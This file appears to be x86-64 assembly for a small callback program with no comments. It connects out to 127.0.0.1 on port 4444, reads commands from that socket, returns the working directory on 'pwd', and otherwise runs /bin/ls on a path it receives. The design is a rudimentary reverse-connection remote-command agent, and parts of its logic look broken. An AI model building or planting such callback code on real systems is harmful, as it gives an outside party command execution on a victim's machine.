BITS 64

section .bss
    introPad resb 8
    sockaddr resb 24
    storeHere resb 8
    currentDir resb 100
    readVal resb 100
    finalVal resb 6
    sysinfoStruct resb 104
    lsFilePath resb 15
    padding resb 64

section .data
    ip_address dd 0x0100007F
    port dw 0x115C
    newline db 0ah

    lsCommand db "/bin/ls", 00h

    lsArgs dq lsCommand, lsFilePath

section .text
global _start

_start:

mov word [sockaddr], 2
mov ax, [port]
xchg al, ah
mov [sockaddr + 2], ax
mov ebx, [ip_address]
mov dword [sockaddr + 4], ebx
xor rax, rax
mov qword [sockaddr + 8], rax

mov rax, 41
xor rdx, rdx
mov rdi, 2
mov rsi, 1
syscall

mov rdi, rax
mov r15, rdi

mov rax, 42
mov rsi, sockaddr
mov rdx, 16
syscall

mov rax, 0
mov rdi, r15
mov rdx, 100
mov rsi, readVal
syscall

xor rbx, rbx
mov bl, byte [readVal+2]
shl rbx, 8
mov bl, byte [readVal+1]
shl rbx, 8
mov bl, byte [readVal]
cmp rbx, "pwd"
je getcwd

mov rbx, [readVal]

shl rbx, 8
shl rbx, 8
shl rbx, 8
shr rbx, 8
shr rbx, 8
shr rbx, 8

mov [lsFilePath], rbx

child:
    mov rax, 58
    syscall

    cmp rax, 0
    jne parent

    mov rdi, lsCommand
    mov rsi, lsArgs
    xor rdx, rdx

    mov rax, 59
    syscall

    jmp exit

parent:
    mov rax, 61
    mov rdi, -1
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rax, 1
    mov rdi, r15
    mov rdx, 100
    mov rsi, readVal
    syscall

    jmp exit

exit:
    mov rax, 60
    syscall

getcwd:
    mov rax, 79
    mov rdi, currentDir
    mov rsi, 100
    syscall

    mov rax, 1
    mov rdi, r15
    mov rdx, 100
    mov rsi, currentDir
    syscall

    mov rax, 1
    mov rdi, r15
    mov rdx, 1
    mov rsi, newline
    syscall

    jmp exit
